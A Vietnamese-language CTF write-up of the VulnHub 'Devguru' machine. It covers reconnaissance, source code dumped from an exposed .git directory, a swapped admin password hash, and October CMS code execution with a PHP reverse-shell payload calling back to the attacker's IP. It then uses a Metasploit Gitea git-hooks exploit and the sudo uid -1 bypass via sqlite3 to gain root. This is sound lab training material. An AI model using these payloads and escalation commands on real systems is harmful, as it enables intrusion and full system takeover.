---
title: Devguru Writeup - VulnHub
date: "2023-07-31 10:43:34"
categories:
  - CTF Writeup
  - VulnHub
tags:
  - hacking
pin: true
---

Download [Devguru VulnHub](https://www.vulnhub.com/entry/devguru-1,620/)

**Level**: Intermediate (Depends on experience)

## Information Gathering

### Arp-scan

Tìm IP của target machine trước rồi làm gì thì làm.

```shell
$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:53:0c:ba, IPv4: 10.0.2.15
...
...
...
10.0.2.10       08:00:27:51:29:a6       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.826 seconds (140.20 hosts/sec). 4 responded

```

`10.0.2.10` là địa chỉ của em nó. Tiến hành scan các port đang public.

### Nmap

```
$ nmap 10.0.2.10 -p- -sC -sV -oN devguru.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 00:04 EDT
Nmap scan report for 10.0.2.10
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2a46e82b01ff57587a5f25a4d6f2898e (RSA)
|   256 0879939ce3b4a4be80ad619dd388d284 (ECDSA)
|_  256 9cf988d43377064ed97c39173e079cbd (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Exception
| http-git:
|   10.0.2.10:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
|_    Project type: PHP application (guessed from .gitignore)
8585/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=b4d52cee4dbbc25b; Path=/; HttpOnly
|     Set-Cookie: _csrf=Xvq-_p9VWny6m7BX11ggBKo0sQc6MTY5MDc3NjM1MTk0NjY5OTQ5Mw; Path=/; Expires=Tue, 01 Aug 2023 04:05:51 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 31 Jul 2023 04:05:51 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=f6e9c48cc95298ca; Path=/; HttpOnly
|     Set-Cookie: _csrf=_EDI06YlyybexCfR5dTZpC2ulkE6MTY5MDc3NjM1MTk1ODQyNTU0Ng; Path=/; Expires=Tue, 01 Aug 2023 04:05:51 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 31 Jul 2023 04:05:51 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
1 service unrecognized despite returning data. If you know the service/version...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.78 seconds
```

Có 3 port đang mở, trong đó 22 và 80 đã quá quen thuộc rồi. Còn 8585 thì sao? Kết quả ở trên cho thấy cổng 8585 đang chạy 1 dịch vụ HTTP, vào trình duyệt web rồi xác định chính xác nó là cái gì

![gitea](/posts/devguru/gitea.PNG)

Gitea, một server Git, là nơi để lưu trữ và quản lý source code. Có thể thấy version Gitea đang chạy là v1.12.5, note lại để lát nữa khai thác. Giờ qua web cổng 80 xem mặt mũi nó ra sao

![landing page](/posts/devguru/landing.PNG)

Chỉ là 1 trang landing, chưa có thông tin gì ở đây.

### Gobuster

```
$ gobuster dir -u http://10.0.2.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/31 00:54:56 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 18641]
/services             (Status: 200) [Size: 10008]
/themes               (Status: 301) [Size: 307] [--> http://10.0.2.10/themes/]
/0                    (Status: 200) [Size: 12649]
/modules              (Status: 301) [Size: 308] [--> http://10.0.2.10/modules/]
/storage              (Status: 301) [Size: 308] [--> http://10.0.2.10/storage/]
/plugins              (Status: 301) [Size: 308] [--> http://10.0.2.10/plugins/]
/About                (Status: 200) [Size: 18641]
/backend              (Status: 302) [Size: 394] [--> http://10.0.2.10/backend/backend/auth]
/Services             (Status: 200) [Size: 10008]
/vendor               (Status: 301) [Size: 307] [--> http://10.0.2.10/vendor/]
/config               (Status: 301) [Size: 307] [--> http://10.0.2.10/config/]
/artisan              (Status: 200) [Size: 1640]
/bootstrap            (Status: 301) [Size: 310] [--> http://10.0.2.10/bootstrap/]
/SERVICES             (Status: 200) [Size: 10008]
/ABOUT                (Status: 200) [Size: 18641]

Progress: 219747 / 220561 (99.63%)[ERROR] 2023/07/31 02:00:12 [!] Get "http://10.0.2.10/t14796": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 220560 / 220561 (100.00%)
===============================================================
2023/07/31 02:00:31 Finished
===============================================================
```

Check qua thì thấy `/backend` là 1 trang admin october cms. Hệ thống này hỗ trợ MySQL, SQLite và PostgreSQL. Tuy nhiên, vẫn chưa tìm ra được trang quản trị csdl. Đang bí bách thì chợt nhớ ra output của nmap có phát hiện ra hệ thống tồn tại thư mục `.git/`

```
...
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Exception
| http-git:
|   10.0.2.10:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit
|     Remotes:
|       http://devguru.local:8585/frank/devguru-website.git
...
```

Vậy thì `.git` là gì?... Đại khái Git là một phần mềm giúp quản lý mã nguồn, phát triển dự án một cách dễ dàng hơn. Mọi thông tin của mã nguồn như: lịch sử thay đổi, các phiên bản sau mỗi lần commit, các đoạn mã và tác giả được lưu lại theo cấu trúc dữ liệu phân tán nằm trong thư mục “.git/" của dự án. Khi phiên bản mới gặp lỗi, nhà phát triển có thể sử dụng phiên bản trước đó được lưu trong git để rollback coi như chưa có từng cuộc chia ly. Đây thực sự là lợi ích to lớn của Git, nhưng cái gì cũng có 2 mặt, `.git` sẽ thực sự nguy hiểm nếu lập trình viên và quản trị hệ thống "quên" không xóa nó trong mã nguồn.

### GitHack

Quay trở lại với lab, đã biết sự tồn tại của .git rồi, giờ làm thế nào để dump toàn bộ mã nguồn từ nó đây? Ở đây tôi sử dụng tools [GitHack](https://github.com/lijiejie/GitHack).

![GitHack](/posts/devguru/githack.PNG)

Rất nhanh chóng, tôi đã có toàn bộ mã nguồn của dự án trong tay :))

## Exploitation

### Initial access

```shell
$ tree -L 2
.
├── adminer.php
├── artisan
├── bootstrap
│   ├── app.php
│   └── autoload.php
├── config
│   ├── app.php
│   ├── auth.php
│   ├── broadcasting.php
│   ├── cache.php
│   ├── cms.php
│   ├── cookie.php
│   ├── database.php
│   ├── environment.php
│   ├── filesystems.php
│   ├── mail.php
│   ├── queue.php
│   ├── services.php
│   ├── session.php
│   └── view.php
├── index.php
├── modules
│   ├── backend
│   ├── cms
│   └── system
├── plugins
│   └── october
├── README.md
├── server.php
├── storage
│   ├── cms
│   ├── framework
│   ├── logs
│   ├── system.json
│   └── temp
└── themes
    └── demo

16 directories, 22 files
```

`adminer.php` là 1 trang quản trị csdl.

![adminer login](/posts/devguru/adminer-login.PNG)

Ta có thể dễ dàng lấy tài khoản quản trị từ file `database.php` trong **config**.

```shell
$ cat config/database.php
...
...
    'default' => 'mysql',
...
...

    'connections' => [

        ...

        'mysql' => [
            'driver'     => 'mysql',
            'engine'     => 'InnoDB',
            'host'       => 'localhost',
            'port'       => 3306,
            'database'   => 'octoberdb',
            'username'   => 'october',
            'password'   => 'SQ66EBYx4GT3byXH',
            'charset'    => 'utf8mb4',
            'collation'  => 'utf8mb4_unicode_ci',
            'prefix'     => '',
            'varcharmax' => 191,
        ],
...
...

```

Lúc này đã vào được trang quản trị csdl, lướt 1 lúc thì thấy có 1 bảng liên quan đến backend users:

![backend users](/posts/devguru/backend_users.PNG)

Ồ, có 1 record và là `is_superuser`, dùng cái này để login vô trang `/backend` ha. Có thể thấy mật khẩu đã được mã hóa bcrypt, Bcrypt là một dạng hash và rất khó để crack. Đến được đây rồi còn mất công crack với chả bruteforce chi nữa :)) generate ra cái bcrypt hash rồi ném vào đấy là xong rồi.

Nhìn vào chuỗi hash mật khẩu hiện tại của frank

**$2y$10$msFxwTTGvbrs5qGzEucRoeOEH3MyLzynEDcJq0bp8vTk/GvmaB.US**

Với **$2y$10** thì đây có nghĩa là bcrypt với round=10

Generate một hash mới với mật khẩu là **password**

**$2y$10$8QO3BNi6GL0DuSBG36vd8.xo3peTUPUDgqaX5ZIlge8olwUZuG7zq**

Update mật khẩu và dùng nó để đăng nhập vào `/backend`

![backend](/posts/devguru/backend.PNG)

### Remote Code Execution

Nghiên cứu một lúc thấy framework này chứa 1 đống lỗ hổng dẫn đến RCE có thể kể đến như upload shell, chèn code,...

Tại trang CMS tôi sẽ tạo 1 page mới và chèn 1 đoạn code sau

```php
<?php

function onStart() {
    echo shell_exec('id');
}
```

`onStart` sẽ được gọi mỗi khi trang được load

![poc](/posts/devguru/poc.PNG)

Vậy là đã test RCE thành công, ta có thể chạy lệnh bất kì tại đây. Tạo payload reverse shell rồi chạy thôi, ở đây mình dùng PHP proc_open payload được generate từ [revshell.com](https://www.revshells.com/).

```php
$sock=fsockopen("10.0.2.15",9005);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Đồng thời tạo 1 netcat listener để lắng nghe kết nối.

```shell
$ nc -lnvp 9005
listening on [any] 9005 ...

```

![RCE payload](/posts/devguru/RCE-payload.PNG)

Save lại và load lại trang `/poc`. Kiểm tra kết nối của listener:

```
$ nc -lnvp 9005
listening on [any] 9005 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.10] 55294
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Privilege Escalation (other user)

[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

LinPEAS là 1 script đắc lực dùng để scan toàn bộ hệ thống, tìm kiếm các đường dẫn khả thi để leo thang đặc quyển trên Linux/Unix, MacOS.

Chờ 1-2p scan, LinPEAS nó trả cho 1 nùi kết quả. Ngồi phân tích một lúc thì phát hiện 1 file hay ho

```shell
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 frank frank 56688 Nov 19  2020 /var/backups/app.ini.bak
...
```

Khả năng cao đây là file backup của file config gitea. Nếu đúng là nó thì ta có thể khai thác thêm thông tin đăng nhập của gitea DB.

```shell
www-data@devguru:/var/backups$ grep -A 10 -i 'database' app.ini.bak
[database]
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
; For Postgres, schema to use if different from "public". The schema must exist beforehand,
; the user must have creation privileges on it, and the user search path must be set
; to the look into the schema first. e.g.:ALTER USER user SET SEARCH_PATH = schema_name,"$user",public;
...
```

Do là gitea cũng chạy db trên cổng 3306, trùng với **october cms**, nên ta quay lại trang adminer và dùng thông tin đăng nhập ở trên.

Sau khi login thành công, loanh quanh thì thấy bảng user, vào thăm hỏi em nó tí.

![user](/posts/devguru/user-table.PNG)

Em nó có 1 record, vẫn là user frank nhưng lần này ở ngôi nhà khác, `gitea`.

![frank gitea](/posts/devguru/frank-gitea.PNG)

Ở dưới trường passwd có thêm **passwd_hash_algo**, giá trị của nó cũng là thuật toán mã hóa cho mật khẩu của frank. Check lại file config của gitea một lần nữa:

```shell
www-data@devguru:/var/backups$ grep -A 10 -i 'pbkdf2' app.ini.bak
; Password Hash algorithm, either "argon2", "pbkdf2", "scrypt" or "bcrypt"
PASSWORD_HASH_ALGO                       = pbkdf2
```

Có thể thấy giá trị mặc định của **passwd_hash_algo** là pbkdf2. Ngoài ra, **passwd_hash_algo** chấp nhận 4 loại hash đó là: "argon2", "pbkdf2", "scrypt" or "bcrypt". Ây dà, có em "bcrypt" đã từng gặp ở ngôi nhà cũ của frank rồi. Giờ chỉ việc thay đổi thuật toán mã hóa về "bcrypt", đồng thời chèn cái passwd hash dưới dạng đó là xong.

![frank gitea](/posts/devguru/frank-gitea-1.PNG)

Ném vào login vô gitea cổng 8585

![gitea home](/posts/devguru/gitea-home.PNG)

Gitea v1.12.5 có chứa 1 lỗ hổng dẫn tới RCE, có mã [CVE-2020-14144](https://www.cvedetails.com/cve/CVE-2020-14144/). Nếu khai thác lỗi này thành công, ta có thể lấy được shell của thằng frank chạy trong hệ thống.

```shell
msf6 > search gitea

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/gitea_git_fetch_rce  2022-05-16       excellent  Yes    Gitea Git Fetch Remote Code Execution
   1  exploit/multi/http/gitea_git_hooks_rce  2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
   2  exploit/multi/http/gogs_git_hooks_rce   2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/gogs_git_hooks_rce
```

Search trong metasploit, tìm thấy 2 module khai thác lỗi RCE của gitea. Ở đây mình dùng module `exploit/multi/http/gitea_git_hooks_rce`

```shell
msf6 > use exploit/multi/http/gitea_git_hooks_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/gitea_git_hooks_rce) > show TARGETS

Exploit TARGETS:
=================

    Id  Name
    --  ----
    0   Unix Command
=>  1   Linux Dropper
    2   Windows Command
    3   Windows Dropper


msf6 exploit(multi/http/gitea_git_hooks_rce) > set TARGET 0
TARGET => 0
msf6 exploit(multi/http/gitea_git_hooks_rce) > set USERNAME frank
USERNAME => frank
msf6 exploit(multi/http/gitea_git_hooks_rce) > set PASSWORD password
PASSWORD => password
msf6 exploit(multi/http/gitea_git_hooks_rce) > set RPORT 8585
RPORT => 8585
msf6 exploit(multi/http/gitea_git_hooks_rce) > set RHOST 10.0.2.10
RHOST => 10.0.2.10
msf6 exploit(multi/http/gitea_git_hooks_rce) > set LHOST 10.0.2.15
LHOST => 10.0.2.15
msf6 exploit(multi/http/gitea_git_hooks_rce) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Gitea version is 1.12.5
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Authenticate with "frank/password"
[+] Logged in
[*] Create repository "Sub-Ex_Bytecard"
[+] Repository created
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created, shell incoming...
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.10:52018) at 2023-07-31 13:34:23 -0400
[*] Cleaning up
[*] Repository Sub-Ex_Bytecard deleted.

id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
uname -a
Linux devguru.local 4.15.0-124-generic #127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
frank@devguru:~/gitea-repositories/frank/tempsoft_matsoft.git$ export TERM=xterm
<ories/frank/tempsoft_matsoft.git$ export TERM=xterm
frank@devguru:~/gitea-repositories/frank/tempsoft_matsoft.git$ cd /home/frank
frank@devguru:/home/frank$ ls
data  user.txt
frank@devguru:/home/frank$ cat user.txt
22854d0aec6ba776f9d35bf7b0e00217
```

User Flag: **22854d0aec6ba776f9d35bf7b0e00217**

### Privilege Escalation (Root)

Kiểm tra đặc quyền của thằng frank

```shell
frank@devguru:/home/frank$ sudo -l
Matching Defaults entries for frank on devguru:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on devguru:
    (ALL, !root) NOPASSWD: /usr/bin/sqlite3

```

Với thông tin ở trên, ta có thể thấy thằng frank có thể chạy file sqlite3 kia nhưng không được phép chạy dưới quyền root.

```shell
frank@devguru:/home/frank$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

```

Thật không may cho Devguru, với phiên bản của sudo v1.8.28, có mã [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287), cho phép kẻ tấn công có thể chạy dưới ALL sudoer nhưng bypass blacklists, bỏ qua cấu hình !root ở trên bằng cách sudo với craft user id `\#$((0xffffffff))`.

```shell
frank@devguru:/home/frank$ sudo -u#$((0xffffffff)) sqlite3 /dev/null '.shell /bin/bash'
root@devguru:/home/frank# id
uid=0(root) gid=1000(frank) groups=1000(frank)
```

Giải thích một chút, ở đây `0xffffffff` tương đương với số nguyên không dấu 4294967295 ~ 2^32-1. Đây là giá trị lớn nhất mà một số nguyên 32-bit không dấu có thể biểu diễn được, thường được sử dụng trong các ngôn ngữ lập trình như C/C++, ... Khi kết hợp với 1 số cấu hình sai trong tệp sudoers, nó có thể cho phép user có uid là 4294967295 (giá trị của 0xffffffff) leo lên quyền root.

```shell
sqlite> .help
...
.shell CMD ARGS...     Run CMD ARGS... in a system shell
...
```

=> Tóm lại, `sudo -u#$((0xffffffff)) sqlite3 /dev/null '.shell /bin/bash'` cho phép chạy một shell mới dưới quyền root.

```shell
root@devguru:/home/frank# cd /root
root@devguru:/root# ls
msg.txt  root.txt
root@devguru:/root# cat msg.txt

           Congrats on rooting DevGuru!
  Contact me via Twitter @zayotic to give feedback!


root@devguru:/root# cat root.txt
96440606fb88aa7497cde5a8e68daf8f
```
